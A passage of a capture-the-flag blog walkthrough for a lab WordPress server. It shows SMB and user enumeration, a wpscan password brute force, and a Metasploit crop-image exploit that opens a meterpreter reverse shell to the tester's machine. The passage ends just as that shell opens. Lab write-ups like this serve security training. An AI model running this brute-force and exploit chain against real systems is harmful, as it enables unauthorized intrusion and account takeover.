+        BillySMB        Disk      Billy<span class="s1">'s local SMB Share
+        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            BLOG
+
+[+] Attempting to map shares on 10.10.43.206
+
+//10.10.43.206/print$   Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.43.206/BillySMB Mapping: OK Listing: OK Writing: N/A
+
+[E] Can'</span>t understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>
+//10.10.43.206/IPC<span class="nv">$ </span>    Mapping: N/A Listing: N/A Writing: N/A
+
+ <span class="o">============================(</span> Password Policy Information <span class="k">for </span>10.10.43.206 <span class="o">)============================</span>
+
+
+
+<span class="o">[</span>+] Attaching to 10.10.43.206 using a NULL share
+
+<span class="o">[</span>+] Trying protocol 139/SMB...
+
+<span class="o">[</span>+] Found domain<span class="o">(</span>s<span class="o">)</span>:
+
+        <span class="o">[</span>+] BLOG
+        <span class="o">[</span>+] Builtin
+
+<span class="o">[</span>+] Password Info <span class="k">for </span>Domain: BLOG
+
+        <span class="o">[</span>+] Minimum password length: 5
+        <span class="o">[</span>+] Password <span class="nb">history </span>length: None
+        <span class="o">[</span>+] Maximum password age: 37 days 6 hours 21 minutes 
+        <span class="o">[</span>+] Password Complexity Flags: 000000
+
+                <span class="o">[</span>+] Domain Refuse Password Change: 0
+                <span class="o">[</span>+] Domain Password Store Cleartext: 0
+                <span class="o">[</span>+] Domain Password Lockout Admins: 0
+                <span class="o">[</span>+] Domain Password No Clear Change: 0
+                <span class="o">[</span>+] Domain Password No Anon Change: 0
+                <span class="o">[</span>+] Domain Password Complex: 0
+
+        <span class="o">[</span>+] Minimum password age: None
+        <span class="o">[</span>+] Reset Account Lockout Counter: 30 minutes 
+        <span class="o">[</span>+] Locked Account Duration: 30 minutes 
+        <span class="o">[</span>+] Account Lockout Threshold: None
+        <span class="o">[</span>+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+
+<span class="o">[</span>+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ <span class="o">=======================================(</span> Groups on 10.10.43.206 <span class="o">)=======================================</span>
+
+
+<span class="o">[</span>+] Getting <span class="nb">builtin groups</span>:
+
+
+<span class="o">[</span>+]  Getting <span class="nb">builtin </span>group memberships:
+
+
+<span class="o">[</span>+]  Getting <span class="nb">local groups</span>:
+
+
+<span class="o">[</span>+]  Getting <span class="nb">local </span>group memberships:
+
+
+<span class="o">[</span>+]  Getting domain <span class="nb">groups</span>:
+
+
+<span class="o">[</span>+]  Getting domain group memberships:
+
+
+ <span class="o">==================(</span> Users on 10.10.43.206 via RID cycling <span class="o">(</span>RIDS: 500-550,1000-1050<span class="o">)</span> <span class="o">)==================</span>
+
+
+<span class="o">[</span>I] Found new SID: 
+S-1-22-1
+
+<span class="o">[</span>I] Found new SID: 
+S-1-5-32
+
+<span class="o">[</span>I] Found new SID: 
+S-1-5-32
+
+<span class="o">[</span>I] Found new SID: 
+S-1-5-32
+
+<span class="o">[</span>I] Found new SID: 
+S-1-5-32
+
+<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-5-21-3132497411-2525593288-1635041108 and logon username <span class="s1">''</span>, password <span class="s1">''</span>
+
+S-1-5-21-3132497411-2525593288-1635041108-501 BLOG<span class="se">\n</span>obody <span class="o">(</span>Local User<span class="o">)</span>
+S-1-5-21-3132497411-2525593288-1635041108-513 BLOG<span class="se">\N</span>one <span class="o">(</span>Domain Group<span class="o">)</span>
+
+<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-22-1 and logon username <span class="s1">''</span>, password <span class="s1">''</span>
+
+S-1-22-1-1000 Unix User<span class="se">\b</span>joel <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1001 Unix User<span class="se">\s</span>mb <span class="o">(</span>Local User<span class="o">)</span>
+
+<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-5-32 and logon username <span class="s1">''</span>, password <span class="s1">''</span>
+
+S-1-5-32-544 BUILTIN<span class="se">\A</span>dministrators <span class="o">(</span>Local Group<span class="o">)</span>
+S-1-5-32-545 BUILTIN<span class="se">\U</span>sers <span class="o">(</span>Local Group<span class="o">)</span>
+S-1-5-32-546 BUILTIN<span class="se">\G</span>uests <span class="o">(</span>Local Group<span class="o">)</span>
+S-1-5-32-547 BUILTIN<span class="se">\P</span>ower Users <span class="o">(</span>Local Group<span class="o">)</span>
+S-1-5-32-548 BUILTIN<span class="se">\A</span>ccount Operators <span class="o">(</span>Local Group<span class="o">)</span>
+S-1-5-32-549 BUILTIN<span class="se">\S</span>erver Operators <span class="o">(</span>Local Group<span class="o">)</span>
+S-1-5-32-550 BUILTIN<span class="se">\P</span>rint Operators <span class="o">(</span>Local Group<span class="o">)</span>
+
+ <span class="o">===============================(</span> Getting printer info <span class="k">for </span>10.10.43.206 <span class="o">)===============================</span>
+
+No printers returned.
+</pre></table></code></div></div><p>Now we are getting somewhere..! We have <code class="language-plaintext highlighter-rouge">BillySMB</code> local share (For knowing the permissions allowed, we’ll run smbmap) and we got an username <code class="language-plaintext highlighter-rouge">bjoel</code>..!</p><p><img data-src="/assets/Blog/bjoel-wp.png" alt="bjoel wp-login" data-proofer-ignore></p><h3 id="smbmap"><span class="mr-2">smbmap</span><a href="#smbmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents etc.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> 10.10.43.206          
+<span class="o">[</span>+] Guest session       IP: 10.10.43.206:445    Name: blog.thm                                          
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        print<span class="nv">$ </span>                                                 NO ACCESS       Printer Drivers
+        BillySMB                                                READ, WRITE     Billy<span class="s1">'s local SMB Share
+        IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
+
+</span></pre></table></code></div></div><p>Okay! We have Read-Write access on this local SMB share. Cool..!</p><h3 id="smbclient"><span class="mr-2">smbclient</span><a href="#smbclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>SMBClient communicates with a LAN Manager server, offering an interface similar to that of the ftp program.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>──<span class="o">(</span>uber㉿uber<span class="o">)</span>-[~/Desktop/THM/BillyBlog]
+└─<span class="nv">$ </span>smbclient //10.10.43.206/BillySMB
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\u</span>ber]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Sun May  1 17:49:34 2022
+  ..                                  D        0  Tue May 26 23:28:23 2020
+  Alice-White-Rabbit.jpg              N    33378  Tue May 26 23:47:01 2020
+  tswift.mp4                          N  1236733  Tue May 26 23:43:45 2020
+  check-this.png                      N     3082  Tue May 26 23:43:43 2020
+
+                15413192 blocks of size 1024. 9787876 blocks available
+smb: <span class="se">\&gt;</span> 
+
+</pre></table></code></div></div><p>Hmmm.. what kind of files are these?? Let’s check them by fetching them into our system.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>smb: <span class="se">\&gt;</span> get Alice-White-Rabbit.jpg 
+getting file <span class="se">\A</span>lice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg <span class="o">(</span>34.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 34.6 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> get tswift.mp4 
+getting file <span class="se">\t</span>swift.mp4 of size 1236733 as tswift.mp4 <span class="o">(</span>212.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 187.4 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> get check-this.png 
+getting file <span class="se">\c</span>heck-this.png of size 3082 as check-this.png <span class="o">(</span>4.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 170.2 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+</pre></table></code></div></div><p>Man..! hahhah the <code class="language-plaintext highlighter-rouge">tswift.mp4</code> made me kinda lol, the <code class="language-plaintext highlighter-rouge">check-this.png</code> is a qr code which leads us to a youtube song video and the <code class="language-plaintext highlighter-rouge">Alice-White-Rabbit.jpg</code> looks like just a normal picture at first glance</p><p><img data-src="/assets/Blog/Alice-White-Rabbit.jpg" alt="Alice White Rabbit" data-proofer-ignore></p><p>But, I have a feeling that the whole rabbit hole thing doesn’t fit right. We should look this file for any hidden steganography.</p><h3 id="steghide"><span class="mr-2">steghide</span><a href="#steghide" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>steghide extract <span class="nt">-sf</span> Alice-White-Rabbit.jpg <span class="nt">-v</span>
+Enter passphrase: 
+reading stego file <span class="s2">"Alice-White-Rabbit.jpg"</span>... <span class="k">done
+</span>extracting data... <span class="k">done
+</span>checking crc32 checksum... ok
+writing extracted data to <span class="s2">"rabbit_hole.txt"</span>... <span class="k">done</span>
+</pre></table></code></div></div><p>Hmmm..this file name really doesn’t look good..hahah. Let’s check it out.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nb">cat </span>rabbit_hole.txt                                         
+You<span class="s1">'ve found yourself in a rabbit hole, friend.
+</span></pre></table></code></div></div><p>Man.. What a rabbit hole we fell into..! lol</p><h3 id="wpscan"><span class="mr-2">wpscan</span><a href="#wpscan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+</pre><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> 10.10.43.206 <span class="nt">-e</span> u
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.43.206/ [10.10.43.206]
+[+] Started:
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.43.206/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.43.206/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.43.206/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.43.206/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.43.206/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.43.206/, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>5.0<span class="s1">'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.43.206/, Match: '</span>WordPress 5.0<span class="s1">'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] bjoel
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://10.10.43.206/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] kwheel
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://10.10.43.206/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Karen Wheeler
+ | Found By: Rss Generator (Aggressive Detection)
+
+[+] Billy Joel
+ | Found By: Rss Generator (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun May  1 18:58:28 2022
+[+] Requests Done: 31
+[+] Cached Requests: 33
+[+] Data Sent: 8.067 KB
+[+] Data Received: 349.2 KB
+[+] Memory used: 157.012 MB
+[+] Elapsed time: 00:00:07
+</span></pre></table></code></div></div><p>We got another username <code class="language-plaintext highlighter-rouge">kwheel</code>. Nice..!</p><p><img data-src="/assets/Blog/kwheel-wp.png" alt="kwheel wp-login" data-proofer-ignore></p><h3 id="hydra"><span class="mr-2">hydra</span><a href="#hydra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote class="prompt-warning"><div><p>Hydra will not work as intended with both the usernames, advised to skip.</p></div></blockquote><h3 id="wpscan-for-password"><span class="mr-2">wpscan for password</span><a href="#wpscan-for-password" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Try with <code class="language-plaintext highlighter-rouge">kwheel</code> username as getting the password for <code class="language-plaintext highlighter-rouge">bjoel</code> is not working properly.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>uber㉿uber<span class="o">)</span>-[~/Desktop/THM/BillyBlog]
+└─<span class="nv">$ </span>wpscan <span class="nt">--url</span> 10.10.43.206 <span class="nt">-U</span> <span class="s1">'kwheel'</span> <span class="nt">-P</span> /home/uber/Downloads/rockyou.txt
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.43.206/ [10.10.43.206]
+[+] Started:
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.43.206/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.43.206/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.43.206/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.43.206/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.43.206/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.43.206/, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>5.0<span class="s1">'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.43.206/, Match: '</span>WordPress 5.0<span class="s1">'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:07 &lt;=======================================================&gt; (137 / 137) 100.00% Time: 00:00:07
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - kwheel / redacted
+
+[!] Valid Combinations Found:
+ | Username: kwheel, Password: redacted
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished:
+[+] Requests Done: 3032
+[+] Cached Requests: 5
+[+] Data Sent: 1.489 MB
+[+] Data Received: 1.878 MB
+[+] Memory used: 226.121 MB
+[+] Elapsed time: 00:04:30
+</span></pre></table></code></div></div><p>Got the password..!</p><p><img data-src="/assets/Blog/kwheel-login.png" alt="kwheel wordpress login" data-proofer-ignore></p><h3 id="cve"><span class="mr-2">cve</span><a href="#cve" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We know that the wordpress version is 5.0 and it is vulnerable, so we’ll search for an exploit which will help us in moving further.</p><p><img data-src="/assets/Blog/cve.png" alt="cve details" data-proofer-ignore></p><h2 id="getting-shell"><span class="mr-2">Getting Shell</span><a href="#getting-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="msfconsole"><span class="mr-2">msfconsole</span><a href="#msfconsole" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>uber㉿uber<span class="o">)</span>-[~/Desktop/THM/BillyBlog]
+└─<span class="nv">$ </span><span class="nb">sudo </span>msfconsole                          
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>uber: 
+                                                  
+     ,           ,
+    /             <span class="se">\</span>
+   <span class="o">((</span>__---,,,---__<span class="o">))</span>
+      <span class="o">(</span>_<span class="o">)</span> O O <span class="o">(</span>_<span class="o">)</span>_________
+         <span class="se">\ </span>_ /            |<span class="se">\</span>
+          o_o <span class="se">\ </span>  M S F   | <span class="se">\</span>
+               <span class="se">\ </span>  _____  |  <span class="k">*</span>
+                <span class="o">||</span>|   WW|||
+                <span class="o">||</span>|     <span class="o">||</span>|
+
+
+       <span class="o">=[</span> metasploit v6.1.39-dev                          <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 2214 exploits - 1171 auxiliary - 396 post       <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 614 payloads - 45 encoders - 11 nops            <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 9 evasion                                       <span class="o">]</span>
+
+Metasploit tip: Save the current environment with the 
+save <span class="nb">command</span>, future console restarts will use this 
+environment again
+
+msf6 <span class="o">&gt;</span> search crop-image
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                            Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                            <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce
+
+msf6 <span class="o">&gt;</span> use 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.43.206
+RHOSTS <span class="o">=&gt;</span> 10.10.43.206
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> options
+
+Module options <span class="o">(</span>exploit/multi/http/wp_crop_rce<span class="o">)</span>:
+
+   Name       Current Setting  Required  Description
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   PASSWORD                    <span class="nb">yes       </span>The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS     10.10.43.206     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
+                                         t
+   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   TARGETURI  /                <span class="nb">yes       </span>The base path to the wordpress application
+   USERNAME                    <span class="nb">yes       </span>The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.0.2.15        <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   WordPress
+
+
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD redacted
+PASSWORD <span class="o">=&gt;</span> redacted
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USERNAME kwheel
+USERNAME <span class="o">=&gt;</span> kwheel
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.9.2.90
+LHOST <span class="o">=&gt;</span> 10.9.2.90
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 1234
+LPORT <span class="o">=&gt;</span> 1234
+msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.9.2.90:1234 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using kwheel:redacted...
+<span class="o">[</span>+] Authenticated with WordPress
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload
+<span class="o">[</span>+] Image uploaded
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Including into theme
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>39860 bytes<span class="o">)</span> to 10.10.43.206
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to clean up files...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.9.2.90:1234 -&gt; 10.10.43.206:57986 <span class="o">)</span> at 
+
+meterpreter <span class="o">&gt;</span> 
+</pre></table></code></div></div><p>We got a meterpreter shell..nice..!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
